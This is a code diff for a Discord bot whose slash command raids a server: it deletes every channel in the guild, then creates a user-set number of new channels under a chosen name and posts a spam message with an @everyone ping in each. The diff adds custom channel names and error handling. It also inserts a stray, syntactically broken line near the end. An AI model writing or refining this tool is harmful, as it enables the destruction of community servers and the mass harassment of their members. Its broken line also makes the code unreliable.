@@ -1,4 +1,4 @@
-const { Client, IntentsBitField, ChannelType } = require('discord.js');
+const { Client, IntentsBitField, ChannelType, DiscordAPIError } = require('discord.js');
 
 // Load environment variables
 require('dotenv').config();
@@ -18,6 +18,9 @@ client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}! ✅`);
 });
 
+
+
+
 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
 
@@ -31,10 +34,16 @@ client.on('interactionCreate', async (interaction) => {
     // defaults
     defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${client.user} !!! \n @everyone`
     defaultSpamAMT = 10;
+    defaultChannelname = 'RAID'
+    const defaultErrorMessage = 'An internal error has occured, please check console.'
 
+    const throwInteractionError = (errorMessage) => {
+      interaction.reply({content: errorMessage, ephemeral: true});
+    }
 
     let spamAMTbyUser = interaction.options.getInteger('message-amount')
     let userMessage = interaction.options.getString('raid-message');
+    let userChannelname = interaction.options.getString('channel-name')
 
     if (userMessage == null) {
       userMessage = defaultMessage
@@ -43,57 +52,61 @@ client.on('interactionCreate', async (interaction) => {
     if (spamAMTbyUser == null) {
       spamAMTbyUser = defaultSpamAMT
     }
+
+    if (userChannelname == null) {
+      userChannelname = defaultChannelname
+    }
   
-    // Get the guild
+   
     const guild = interaction.guild;
 
-    // Fetch all channels and delete them
     try {
-      await guild.channels.cache.forEach(channel => channel.delete());
+      const channels = Array.from(guild.channels.cache.values());
+      for (const channel of channels) {
+        await channel.delete();
+      }
     } catch (error) {
-      interaction.reply({content: 'FAILED TO RAID! BOT NOT GIVEN PERMISSIONS.'})
+      console.error("Error deleting channels:", error);
+      throwInteractionError('Raid Failed ! Invaild Permissions.');
       return;
     }
-
-    interaction.reply({ content: 'All channels have been removed.', ephemeral: true });
-
+    
+    
 
     try {
       const newChannel = await guild.channels.create({
-        
-        name: 'RAID', 
-        
+        name: `${userChannelname}`, 
         type: ChannelType.GuildText,
       });
 
-
       try{
-        
         for (let i = 0; i < spamAMTbyUser; i++) {
           // Duplicate the channel
           const duplicateChannel = await guild.channels.create({
-            name: `RAID-${i+1}`,
+            name: `${userChannelname}-${i+1}`,
             type: ChannelType.GuildText,
             parent: newChannel.parent, // Set the same parent as the original channel if applicable
           });
       
           // Send message to duplicate channel
           await duplicateChannel.send(userMessage);
-      }
+        }
       } catch (error) {
+        throwInteractionError(defaultErrorMessage);
         console.error("Error creating duplicate channels:", error);
       }
       
-      
     } catch (error) {
-
-        console.log(`an error has occured, ${error}`)
-        return;
+      throwInteractionError(defaultErrorMessage);
+      console.log(`an error has occured, ${error}`)
+      return;
     }
     
     // Send the user's message in the new channel
   }
 });
+
+if (interaction == '')
 
 client.on('messageCreate', (message) => {
   if (message.content === '<@1150483197503741962>') {
